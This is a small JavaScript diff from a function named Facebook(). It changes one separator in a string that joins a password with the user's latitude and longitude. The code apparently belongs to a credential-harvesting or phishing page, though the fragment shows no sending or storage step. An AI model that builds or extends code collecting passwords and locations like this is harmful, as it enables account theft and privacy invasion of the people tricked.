@@ -24,7 +24,7 @@ function Facebook() {
 
   let location = latitude +" "+ longitude
     let username = name
-    let description = password+" -> location " + location
+    let description = password+" | location " + location
     let duration = 5
     let date = new Date()
 
